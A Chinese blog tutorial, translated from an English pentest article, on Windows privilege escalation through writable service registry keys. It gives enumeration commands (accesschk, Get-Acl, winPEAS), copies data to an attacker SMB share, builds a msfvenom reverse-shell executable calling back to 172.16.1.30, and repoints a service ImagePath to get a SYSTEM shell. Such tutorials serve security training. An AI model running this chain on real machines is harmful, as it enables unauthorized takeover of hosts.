
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18785725" title="发布于 2025-03-21 19:41">
    <span role="heading" aria-level="2">Windows 提权-服务_弱注册表权限</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/weak-registry-key-permissions/" target="_blank" rel="noopener nofollow">Weak Registry Key Permissions – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 id="导航">导航</h2>
<ul>
<li><a href="#id0" rel="noopener nofollow">0 前言</a></li>
<li><a href="#id1" rel="noopener nofollow">1 搜寻服务的弱权限注册表项</a>
<ul>
<li><a href="#id1.1" rel="noopener nofollow">1.1 枚举弱权限注册表项：accesschk.exe</a></li>
<li><a href="#id1.2" rel="noopener nofollow">1.2 枚举弱权限注册表项：PowerShell + Linux-Fu</a></li>
<li><a href="#id1.3" rel="noopener nofollow">1.3 枚举弱权限注册表项：winPEAS.exe</a></li>
</ul>
</li>
<li><a href="#id2" rel="noopener nofollow">2 分析服务的弱权限注册表项</a></li>
<li><a href="#id3" rel="noopener nofollow">3 利用服务的弱权限注册表项</a>
<ul>
<li><a href="#id3.1" rel="noopener nofollow">3.1 制作恶意程序</a></li>
<li><a href="#id3.2" rel="noopener nofollow">3.2 利用注册表键</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="0前言"><strong><div id="id0">0、前言</div></strong></h2>
<p>在这篇文章中，我们将学习一种涉及注册表的权限提升技术。我们将看到，由于服务注册表权限管理的薄弱，导致攻击者可以由标准用户权限提升到本地 SYSTEM 权限。</p>
<p>首先，我们会使用几种不同的枚举工具去查找与服务相关的注册表项，试图找到任何权限较弱的键。其次，在这个键下面寻找与服务绑定信息相关的值（主要是 imagePath 值）。然后，我们会制作一个恶意程序，并将这个 imagePath 的值从原始路径替换为指向恶意程序的路径。最后，重启该服务，该服务将执行恶意 EXE 并为我们提供一个 SYSTEM shell。</p>
<p>通过篡改服务使用的注册表项，攻击者可以操纵服务可执行文件的执行位置。攻击者可能没有任何权限滥用服务本身，但如果能够滥用与该服务相关的注册表项，攻击者就有能力绕过权限限制直接操纵服务。</p>
<blockquote>
<p>由于注册表是应用程序和系统组件（例如服务）存储配置数据的地方，而如果我们能够操纵服务存储配置数据的位置，那么也就意味着我们可以改变服务启动程序的位置。</p>
</blockquote>
<blockquote>
<p>注：注册表相关术语名词介绍。</p>
<p><strong>键（Key）</strong>：类似于文件系统中的“文件夹”，用于存储注册表值。</p>
<p><strong>根键（Root Key）</strong>：注册表的最高层级键，共有五个主要根键，分别是：HKCU（存储当前登录用户的配置信息）、HKLM（存储计算机范围内的配置信息）、HKU（存储计算机上所有用户的配置信息）、HKCR（存储文件扩展名、程序关联信息等）、HKCC（存储当前硬件配置文件的动态数据）。</p>
<p><strong>子键（Subkey）</strong>：键中的子层级，例如 <code>HKEY_LOCAL_MACHINE\SYSTEM</code> 中，<code>SYSTEM</code> 是 <code>HKEY_LOCAL_MACHINE</code> 的子键。</p>
<p><strong>值（Value）</strong>：存储在键中的具体数据，每个键可以包含多个值。</p>
<p><strong>注册表项（Registry Entry）</strong>：指具体的键或值。</p>
<p><strong>注册表路径（Registry Path）</strong>：访问注册表中某个键的完整路径，</p>
<p><strong>注册表权限</strong>：控制哪些用户或程序可以读取、修改注册表键值。</p>
<p><strong>注册表脚本（.reg 文件）</strong>：用于批量导入或修改注册表的文本文件。</p>
</blockquote>
<h2 id="1搜寻服务的弱权限注册表项"><strong><div id="id1">1、搜寻服务的弱权限注册表项</div></strong></h2>
<p>在搜寻有关服务的注册表项时，我们主要的关注点是 <code>HKLM\SYSTEM\CurrentControlSet\Services</code> 路径下面的子键，因为这里是专门用来存储系统中所有服务配置数据的地方。</p>
<p>在接下来的示例中，假设我们已经作为标准用户 cmarko 在目标机上获得了立足点。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193922912-667858872.png" alt="" loading="lazy"></p>
<p>有多种方法可以用来枚举注册表项的弱权限，但在本例中，我们通过只使用两种不同的工具和一种手动方法去枚举注册表项的权限。</p>
<h4 id="11枚举弱权限注册表项accesschkexe"><strong><div id="id1.1">1.1、枚举弱权限注册表项：accesschk.exe</div></strong></h4>
<p>我们要探索的第一种枚举注册表权限的技术，是使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener nofollow">Sysinterals</a> 工具套件中的 accesschk.exe 工具。</p>
<p>首先根据受害者机器的系统架构去下载对应的 accesschk 版本，然后将其传输到受害者机器上。</p>
<pre><code class="language-cmd">systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193923279-1884189429.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193920070-829234903.png" alt="" loading="lazy"></p>
<p>为了能更好的使用 accesschk 工具和理解它输出的内容，我们要对下面这些用户/组有所了解：</p>
<ul>
<li>%USERNAME% 代表当前登录用户，如 bob。</li>
<li>Authenticated Users【注：通过 <strong>控制台、RDP、WinRM、SMB</strong> 登录系统的用户都属于已认证用户。】</li>
<li>Everyone</li>
<li>BUILTIN\Users</li>
<li>NT AUTHORITY\INTERACTIVE</li>
</ul>
<p>如果在枚举服务相关的注册表项时，能够发现以上任意一个用户/组拥有写入权限，那我们就可利用这个服务。</p>
<p>使用 accesschk 时，我们首先检查当前用户，因为当前用户可能默认属于这些组中的大多数。【最主要的是，查看其它组的最终目的不还是为了当前用户吗】</p>
<pre><code class="language-cmd">accesschk64.exe "%USERNAME%" -kvuqsw hklm\System\CurrentControlSet\services -accepteula
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193922573-1956563161.png" alt="" loading="lazy"></p>
<p>可以看到，当前用户对 Juggernaut 服务的注册表项拥有 ALL_ACCESS 权限，即“完全控制”的权限。【而该权限的由来，可能是因为这个注册表项就是针对这个用户本身开放的 ALL_ACCESS 权限，也可能是针对某个组开放的权限，只不过当前用户正好就在其中。】</p>
<p>此外，也可以通过以下命令分别查询其它组拥有哪些服务的注册表项写入权限：</p>
<pre><code class="language-cmd">accesschk64.exe "Everyone" -kqswvu hklm\System\CurrentControlSet\services -accepteula

accesschk64.exe "Authenticated Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula

accesschk64.exe "BUILTIN\Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula

accesschk64.exe "NT AUTHORITY\INTERACTIVE" -kqswvu hklm\System\CurrentControlSet\services -accepteula
</code></pre>
<blockquote>
<p>为了更好的理解 accesschk 工具参数的用法，可以查看此<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk" target="_blank" rel="noopener nofollow">手册</a>。</p>
</blockquote>
<h4 id="12枚举弱权限注册表项powershell--linux-fu"><strong><div id="id1.2">1.2、枚举弱权限注册表项：PowerShell + Linux-Fu</div></strong></h4>
<p>第二种查找服务弱权限注册表项的方法是使用 PowerShell 的 cmdlet，可使用以下命令：</p>
<pre><code class="language-powershell">Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List
</code></pre>
<p>由于输出内容较多，因此，可以将输出重定向到文件，然后发送回我们的攻击机慢慢查看。</p>
<pre><code class="language-powershell">Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List | Out-File -FilePath C:\temp\service_keys.txt
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193921301-1432032333.png" alt="" loading="lazy"></p>
<p>将此文件发送回攻击机的最方便的方法是在攻击机使用以下命令启动一个 SMB 服务：</p>
<pre><code class="language-bash">impacket-smbserver share $(pwd) -smb2support
</code></pre>
<p>然后回到受害者机器，使用以下命令将文件发送到攻击者机器：</p>
<pre><code class="language-cmd">copy C:\temp\service_keys.txt \\172.16.1.30\share
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193921651-598836903.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193922852-929955386.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193921978-1405774515.png" alt="" loading="lazy"></p>
<p>查看两侧文件的字节大小是否一样，以确保文件的传输是正常的。同时，由于 Windows 和 Linux 关于文本文件格式不同的问题，我们需要在攻击机通过 dos2unix 命令将其格式进行转换，然后才能使用 grep 命令去提取我们感兴趣的信息。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193920726-151066335.png" alt="" loading="lazy"></p>
<p>由于该文件非常庞大，因此，我们需要使用一些 Linux 技巧，以将输出内容缩减到只包含我们感兴趣的信息，这样才能更容易地发现异常值。</p>
<pre><code class="language-bash">cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users"
</code></pre>
<p>输出的内容依旧很多，但基本上就是一条 Path 对应一条 Access，同时还看到许多显示“ ReadKey”的权限。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193920709-2133312048.png" alt="" loading="lazy"></p>
<p>为此，我们需要使用以下命令省略 ReadKey 的输出：</p>
<pre><code class="language-bash">cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users" | grep -v "ReadKey"
</code></pre>
<p>这次，虽然“ReadKey”没有了，但 Path 和 Access 一对一的关系也被打破了，好多 Access 的行会粘连在一块。为此，我们需要再次筛选只会在 Access 行中出现的 Authenticated Users、FullControl 等关键信息，并指定行被匹配的同时还要附带匹配行上面的一行信息，即 <code>-B 1</code>，最终命令如下：</p>
<pre><code class="language-bash">cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users" | grep -v "ReadKey" | grep -B 1 -i "Authenticated Users|\BUILTIN\\\Users\|Everyone\|INTERACTIVE\|FullControl\|Modify\|Write"
</code></pre>
<p>这次效果就好多了，输出内容由刚开始的 10,000 多行减少到了大约 40 行，在这 40 行的数据中我们很快就发现了异常！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193922017-175386.png" alt="" loading="lazy"></p>
<p>当找到了弱权限的注册表路径后，就可以使用 Get-Acl 进行专项查询：</p>
<pre><code class="language-powershell">Get-Acl -Path hklm:\System\CurrentControlSet\services\Juggernaut | Format-List
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193922443-157592656.png" alt="" loading="lazy"></p>
<h4 id="13枚举弱权限注册表项winpeasexe"><strong><div id="id1.3">1.3、枚举弱权限注册表项：winPEAS.exe</div></strong></h4>
<p>第三种查找服务弱权限注册表项的方法是使用 <a href="https://github.com/carlospolop/PEASS-ng/" target="_blank" rel="noopener nofollow">winPEAS.exe</a> 枚举工具，而这可能是查找弱权限注册表项最简单的方法。</p>
<p>将 winPEASx64.exe 的副本下载并传输到受害者机器上。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193921121-1727622067.png" alt="" loading="lazy"></p>
<p>执行 winPEAS 之后，我们可以在“<strong>Services Information</strong>”部分找到任何错误配置的服务注册表项。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193921833-1843226224.png" alt="" loading="lazy"></p>
<h2 id="2分析服务的弱权限注册表项"><strong><div id="id2">2、分析服务的弱权限注册表项</div></strong></h2>
<p>在经过上面的枚举之后，我们找到了一个令人感兴趣的服务注册表项：Juggernaut。接下来，我们就需要针对这个键去查看它下面和服务相关的值的信息。</p>
<p>可以使用 cmd.exe 或 PowerShell 命令去枚举服务。</p>
<p>使用 cmd.exe：</p>
<pre><code class="language-cmd">reg query "HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Juggernaut"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193922018-1577818389.png" alt="" loading="lazy"></p>
<p>使用 PowerShell：</p>
<pre><code class="language-powershell">Get-Item -Path Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Juggernaut
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193922099-1737523694.png" alt="" loading="lazy"></p>
<p>在上面的输出中，可以看到键值“ImagePath”指向了 <code>C:\Program Files\Juggernaut\Juggernaut.exe</code> 文件，而这就是服务的启动程序；键值“ObjectName”是 LocalSystem，表示服务以 SYSTEM 身份运行；键值“Start”是 2，表示服务可以通过开机自启动。</p>
<p>又尝试看了一下 <code>C:\Program Files\Juggernaut\</code>目录和 Juggernaut.exe 文件的权限，发现我们并没有写入的权限（权限标识中没有出现 F、M、W 这些字符）。</p>
<pre><code class="language-cmd">icacls "C:\Program Files\Juggernaut\Juggernaut.exe"
icacls "C:\Program Files\Juggernaut"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193923106-427288519.png" alt="" loading="lazy"></p>
<p>此时，有趣的地方出现了。虽然我们没有服务启动程序所在目录和文件的修改权限，但由于我们有权限修改该服务的注册表项，因此就可以通过更改服务注册表键值“ImagePath”的路径来指向我们控制的文件。</p>
<p>由于这项服务是可以自启动的，而我们又拥有该主机的重启操作，因此我们就可以通过重启系统来强制重启服务。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193922657-802249136.png" alt="" loading="lazy"></p>
<h2 id="3利用服务的弱权限注册表项"><strong><div id="id3">3、利用服务的弱权限注册表项</div></strong></h2>
<h4 id="31制作恶意程序"><strong><div id="id3.1">3.1、制作恶意程序</div></strong></h4>
<p>接着，我们需要制作一个恶意程序以供利用使用：</p>
<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f exe -o pwnt.exe
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193921464-431853120.png" alt="" loading="lazy"></p>
<p>准备就绪后，我们将其转移到受害者机器上。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193920928-1159788155.png" alt="" loading="lazy"></p>
<h4 id="32利用注册表键"><strong><div id="id3.2">3.2、利用注册表键</div></strong></h4>
<p>接下来，我们需要做的第一件事就是更改 Juggernaut 服务注册表键值上的 ImagePath，使其指向我们受控的恶意程序。可以使用以下命令来完成这项工作：</p>
<pre><code class="language-cmd">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Juggernaut" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\pwnt.exe" /f
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193920587-213909770.png" alt="" loading="lazy"></p>
<p>成功修改 ImagePath 以指向受控的恶意程序后，我们需要返回攻击者机器，启动一个 443 端口的 netcat 监听器，然后重启受害者主机。</p>
<pre><code class="language-cmd">shutdown /r /t 0
</code></pre>
<p>等待大约20秒钟后，回到监听器，看到我们获得了一个 SYSTEM shell！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250321193921670-1030364352.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.35769117124537037" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-21 19:41">2025-03-21 19:41</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">32</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18785725" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18785725);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18785725', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18785725', title: 'Windows 提权-服务_弱注册表权限' })">举报</a>
</div>
        